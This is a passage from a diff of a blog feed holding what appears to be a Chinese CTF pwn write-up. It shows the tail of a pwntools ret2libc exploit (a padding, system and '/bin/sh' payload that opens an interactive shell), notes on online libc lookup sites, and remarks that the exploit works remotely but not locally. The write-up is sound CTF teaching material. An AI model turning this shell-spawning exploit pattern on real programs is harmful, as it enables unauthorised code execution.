class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当使用LibcSearcher查询不到时候(好像是版本的问题打不出来)，可以到网上去在线查询，输入相关的函数的地址(后3位即可)，在线查询网：<a href="https://publicki.top/libc/">https://publicki.top/libc/</a> 或者 <a href="https://libc.rip/">https://libc.rip/</a></p>
+<p>本地没pwn掉应该是因为我用的是Ubuntu20的版本问题</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png" alt="image-20220618125557365" style="zoom:80%;" />
+
+<p>但是远程可以打通的</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />
 ]]></content>
       <categories>
         <category>pwn</category>
